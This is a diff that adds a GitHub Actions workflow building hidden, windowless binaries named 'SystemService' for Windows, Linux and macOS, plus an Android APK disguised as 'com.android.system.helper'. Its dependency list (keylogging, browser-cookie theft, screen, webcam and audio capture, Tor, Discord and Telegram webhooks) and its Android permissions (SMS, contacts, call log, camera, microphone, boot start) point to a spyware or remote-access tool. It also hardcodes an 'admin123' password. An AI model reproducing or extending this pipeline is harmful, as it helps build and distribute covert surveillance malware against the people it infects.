@@ -1,1 +1,468 @@
+name: Build and Release
 
+on:
+  push:
+    branches: [ main, master ]
+    tags:
+      - 'v*'
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      release:
+        description: 'Create GitHub Release'
+        type: boolean
+        default: false
+      upload_artifact:
+        description: 'Upload as Build Artifact'
+        type: boolean
+        default: true
+
+env:
+  PYTHON_VERSION: '3.11'
+
+jobs:
+  build-windows:
+    runs-on: windows-2022
+    name: Build Windows Executable
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: ${{ env.PYTHON_VERSION }}
+        cache: 'pip'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller==6.3.0
+        pip install -r requirements.txt 2>$null || echo "No requirements.txt found"
+        pip install requests cryptography Pillow opencv-python numpy sounddevice pynput psutil scapy paramiko dropbox discord-webhook pyTelegramBotAPI pyaudio dnspython python-nmap mechanize PySocks stem mss pyscreenshot GPUtil browser-cookie3 netifaces pycryptodome pywin32 wmi schedule telebot whois
+
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile --noconsole --clean `
+          --name "SystemService" `
+          --add-data "secret;secret" `
+          --hidden-import win32com `
+          --hidden-import win32com.client `
+          --hidden-import win32crypt `
+          --hidden-import win32api `
+          --hidden-import win32gui `
+          --hidden-import win32process `
+          --hidden-import win32security `
+          --hidden-import wmi `
+          --hidden-import scapy.all `
+          --hidden-import cryptography `
+          --hidden-import pynput.keyboard `
+          --hidden-import pynput.mouse `
+          --hidden-import browser_cookie3 `
+          --hidden-import discord_webhook `
+          --hidden-import telebot `
+          --hidden-import PIL.ImageGrab `
+          --hidden-import cv2 `
+          --hidden-import sounddevice `
+          --hidden-import psutil `
+          --hidden-import paramiko `
+          --hidden-import ftplib `
+          --hidden-import mechanize `
+          --hidden-import socks `
+          --hidden-import stem `
+          --hidden-import netifaces `
+          --hidden-import dns.resolver `
+          --hidden-import whois `
+          --hidden-import nmap `
+          --hidden-import GPUtil `
+          --hidden-import mss `
+          --hidden-import pyscreenshot `
+          main.py
+
+    - name: Upload Windows artifact
+      if: ${{ github.event.inputs.upload_artifact != 'false' }}
+      uses: actions/upload-artifact@v4
+      with:
+        name: windows-build
+        path: |
+          dist/SystemService.exe
+          dist/*.exe
+        retention-days: 30
+
+  build-linux:
+    runs-on: ubuntu-22.04
+    name: Build Linux Executable
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: ${{ env.PYTHON_VERSION }}
+        cache: 'pip'
+
+    - name: Install system dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y \
+          python3-dev \
+          python3-tk \
+          libx11-dev \
+          libxext-dev \
+          libxfixes-dev \
+          libxi-dev \
+          libxrandr-dev \
+          libxinerama-dev \
+          libxcursor-dev \
+          libgl1-mesa-dev \
+          libglu1-mesa-dev \
+          libasound2-dev \
+          portaudio19-dev \
+          libportaudio2 \
+          libportaudiocpp0 \
+          ffmpeg \
+          libsm6 \
+          libxrender1 \
+          libgomp1 \
+          libxcb-shape0 \
+          libxcb-xfixes0 \
+          libxcb-randr0 \
+          libxcb-image0 \
+          libxcb-keysyms1 \
+          libxcb-icccm4 \
+          libxcb-sync1 \
+          libxcb-xinerama0 \
+          libxcb-xkb1 \
+          libxkbcommon-x11-0
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller==6.3.0
+        pip install requests cryptography Pillow opencv-python-headless numpy sounddevice pynput psutil scapy paramiko dropbox discord-webhook pyTelegramBotAPI pyaudio dnspython python-nmap mechanize PySocks stem mss pyscreenshot GPUtil browser-cookie3 netifaces pycryptodome schedule telebot whois
+
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile --noconsole --clean \
+          --name "system_service" \
+          --add-data "secret:secret" \
+          --hidden-import scapy.all \
+          --hidden-import cryptography \
+          --hidden-import pynput.keyboard \
+          --hidden-import pynput.mouse \
+          --hidden-import browser_cookie3 \
+          --hidden-import discord_webhook \
+          --hidden-import telebot \
+          --hidden-import PIL.ImageGrab \
+          --hidden-import cv2 \
+          --hidden-import sounddevice \
+          --hidden-import psutil \
+          --hidden-import paramiko \
+          --hidden-import ftplib \
+          --hidden-import mechanize \
+          --hidden-import socks \
+          --hidden-import stem \
+          --hidden-import netifaces \
+          --hidden-import dns.resolver \
+          --hidden-import whois \
+          --hidden-import nmap \
+          --hidden-import GPUtil \
+          --hidden-import mss \
+          --hidden-import pyscreenshot \
+          main.py
+
+    - name: Upload Linux artifact
+      if: ${{ github.event.inputs.upload_artifact != 'false' }}
+      uses: actions/upload-artifact@v4
+      with:
+        name: linux-build
+        path: |
+          dist/system_service
+          dist/*
+        retention-days: 30
+
+  build-macos:
+    runs-on: macos-14
+    name: Build macOS Executable
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: ${{ env.PYTHON_VERSION }}
+        cache: 'pip'
+
+    - name: Install system dependencies
+      run: |
+        brew install portaudio
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller==6.3.0
+        pip install requests cryptography Pillow opencv-python numpy sounddevice pynput psutil scapy paramiko dropbox discord-webhook pyTelegramBotAPI pyaudio dnspython python-nmap mechanize PySocks stem mss pyscreenshot GPUtil browser-cookie3 netifaces pycryptodome schedule telebot whois
+
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile --noconsole --clean \
+          --name "SystemService" \
+          --add-data "secret:secret" \
+          --hidden-import scapy.all \
+          --hidden-import cryptography \
+          --hidden-import pynput.keyboard \
+          --hidden-import pynput.mouse \
+          --hidden-import browser_cookie3 \
+          --hidden-import discord_webhook \
+          --hidden-import telebot \
+          --hidden-import PIL.ImageGrab \
+          --hidden-import cv2 \
+          --hidden-import sounddevice \
+          --hidden-import psutil \
+          --hidden-import paramiko \
+          --hidden-import ftplib \
+          --hidden-import mechanize \
+          --hidden-import socks \
+          --hidden-import stem \
+          --hidden-import netifaces \
+          --hidden-import dns.resolver \
+          --hidden-import whois \
+          --hidden-import nmap \
+          --hidden-import GPUtil \
+          --hidden-import mss \
+          --hidden-import pyscreenshot \
+          main.py
+
+    - name: Upload macOS artifact
+      if: ${{ github.event.inputs.upload_artifact != 'false' }}
+      uses: actions/upload-artifact@v4
+      with:
+        name: macos-build
+        path: |
+          dist/SystemService
+          dist/*
+        retention-days: 30
+
+  build-android:
+    runs-on: ubuntu-22.04
+    name: Build Android APK
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: ${{ env.PYTHON_VERSION }}
+        cache: 'pip'
+
+    - name: Set up Java
+      uses: actions/setup-java@v4
+      with:
+        distribution: 'temurin'
+        java-version: '17'
+
+    - name: Install system dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y \
+          build-essential \
+          git \
+          python3-dev \
+          autoconf \
+          automake \
+          libtool \
+          pkg-config \
+          zlib1g-dev \
+          libncurses5-dev \
+          libtinfo5 \
+          cmake \
+          libffi-dev \
+          libssl-dev \
+          unzip \
+          wget \
+          ccache \
+          libltdl-dev \
+          libsqlite3-dev \
+          libbz2-dev \
+          libreadline-dev \
+          libjpeg-dev \
+          libfreetype6-dev \
+          libpng-dev \
+          patchelf \
+          lld
+
+    - name: Setup Android SDK
+      uses: android-actions/setup-android@v3
+      with:
+        packages: |
+          platforms;android-34
+          build-tools;34.0.0
+          ndk;25.2.9519653
+          cmdline-tools;latest
+          platform-tools
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip setuptools wheel
+        pip install cython==3.0.8
+        pip install buildozer==1.5.0
+        pip install python-for-android==2024.1.21
+        pip install virtualenv
+
+    - name: Create build directories
+      run: |
+        mkdir -p .buildozer
+        mkdir -p secret
+        mkdir -p assets
+
+    - name: Create placeholder files
+      run: |
+        python -c "from PIL import Image; img = Image.new('RGB', (1080, 1920), '#000000'); img.save('presplash.png')" 2>/dev/null || echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > presplash.png
+        python -c "from PIL import Image; img = Image.new('RGB', (512, 512), '#1a1a2e'); img.save('icon.png')" 2>/dev/null || echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
+
+    - name: Create admin hash
+      run: |
+        python -c "
+        import bcrypt
+        pwd = b'admin123'
+        hsh = bcrypt.hashpw(pwd, bcrypt.gensalt())
+        with open('secret/admin.hash', 'wb') as f:
+            f.write(hsh)
+        "
+
+    - name: Create Buildozer spec
+      run: |
+        cat > buildozer.spec << 'EOF'
+        [app]
+        title = System Service
+        package.name = com.android.system.helper
+        package.domain = com.android
+        source.dir = .
+        source.include_exts = py,png,jpg,kv,atlas,txt,json
+        version = 1.0.0
+        
+        requirements = python3,kivy==2.3.0,pyjnius==1.6.1,plyer==2.1.0,android==1.0,requests==2.31.0,cryptography==42.0.5,Pillow==10.2.0,numpy==1.26.4,bcrypt==4.1.2
+        
+        fullscreen = 1
+        orientation = portrait
+        window_state = hidden
+        
+        presplash.filename = %(source.dir)s/presplash.png
+        presplash.color = #000000
+        icon.filename = %(source.dir)s/icon.png
+        
+        log_level = 0
+        
+        [buildozer]
+        log_level = 0
+        
+        [buildozer:android]
+        android.api = 34
+        android.minapi = 21
+        android.ndk = 25.2.9519653
+        android.sdk = 34.0.0
+        android.accept_sdk_license = True
+        
+        android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,ACCESS_COARSE_LOCATION,ACCESS_FINE_LOCATION,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,READ_PHONE_STATE,READ_CONTACTS,WRITE_CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,READ_CALL_LOG,CALL_PHONE,BLUETOOTH,VIBRATE,WAKE_LOCK,SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS
+        
+        android.features = android.hardware.camera,android.hardware.microphone,android.hardware.location,android.hardware.wifi,android.hardware.bluetooth,android.hardware.telephony,android.hardware.touchscreen
+        
+        android.services = myservice,foregroundservice
+        android.arch = armeabi-v7a,arm64-v8a
+        android.allow_backup = False
+        android.large_heap = True
+        android.multidex = True
+        
+        p4a.branch = master
+        p4a.bootstrap = sdl2
+        
+        android.activity_launch_mode = singleTask
+        android.wakelock = True
+        EOF
+
+    - name: Build APK
+      run: |
+        export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
+        export JAVA_HOME=$JAVA_HOME_17_X64
+        export ANDROID_SDK_ROOT=$ANDROID_HOME
+        export ANDROID_NDK_HOME=$ANDROID_HOME/ndk/25.2.9519653
+        buildozer -v android debug 2>&1 | tee build.log
+
+    - name: Upload Android artifact
+      if: ${{ github.event.inputs.upload_artifact != 'false' }}
+      uses: actions/upload-artifact@v4
+      with:
+        name: android-build
+        path: |
+          bin/*.apk
+          .buildozer/android/platform/build-*/dists/*/bin/*.apk
+        retention-days: 30
+
+  create-release:
+    needs: [build-windows, build-linux, build-macos, build-android]
+    if: ${{ github.event.inputs.release == 'true' || startsWith(github.ref, 'refs/tags/v') }}
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    
+    steps:
+    - name: Download all artifacts
+      uses: actions/download-artifact@v4
+      with:
+        path: release-assets
+
+    - name: Organize release assets
+      run: |
+        mkdir -p release
+        find release-assets -name "*.exe" -exec cp {} release/ \;
+        find release-assets -name "system_service" -exec cp {} release/ \;
+        find release-assets -name "SystemService" -exec cp {} release/ \;
+        find release-assets -name "*.apk" -exec cp {} release/ \;
+        ls -la release/
+
+    - name: Create Release
+      uses: softprops/action-gh-release@v1
+      with:
+        name: Release ${{ github.ref_name }}
+        body: |
+          Build Release ${{ github.ref_name }}
+          
+          Build Date: ${{ github.event.repository.updated_at }}
+          Commit: ${{ github.sha }}
+          
+          Assets:
+          - Windows Executable
+          - Linux Executable
+          - macOS Executable
+          - Android APK
+        files: |
+          release/*
+        draft: false
+        prerelease: ${{ !startsWith(github.ref, 'refs/tags/v') }}
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  cleanup:
+    needs: [create-release]
+    if: always()
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    
+    steps:
+    - name: Delete old artifacts
+      uses: geekyeggo/delete-artifact@v5
+      with:
+        name: |
+          windows-build
+          linux-build
+          macos-build
+          android-build
+        failOnError: false
